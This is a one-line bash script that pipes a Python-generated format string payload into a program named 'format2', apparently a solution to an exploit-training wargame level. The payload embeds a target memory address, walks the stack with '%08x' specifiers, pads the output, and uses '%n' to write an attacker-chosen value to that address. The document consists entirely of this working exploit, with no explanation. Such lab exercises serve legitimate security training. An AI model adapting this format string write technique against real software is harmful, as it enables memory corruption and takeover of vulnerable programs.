#!/bin/bash

python -c "print '\xe4\x96\x04\x08'+'%08x.'*2+'%41x'+'+%n+'" | ./format2
